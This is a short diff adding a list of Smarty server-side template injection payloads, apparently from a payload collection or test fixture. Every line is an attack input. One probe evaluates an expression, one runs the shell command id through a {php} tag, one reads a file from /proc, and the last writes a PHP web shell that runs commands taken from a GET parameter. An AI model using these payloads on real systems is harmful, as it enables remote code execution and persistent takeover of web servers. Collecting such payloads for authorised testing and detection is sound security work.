@@ -1,0 +1,5 @@
+{7*7}
+{php}echo `id`;{/php}
+a{*comment*}b
+{self::getStreamVariable("file:///proc/self/loginuid")}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())}
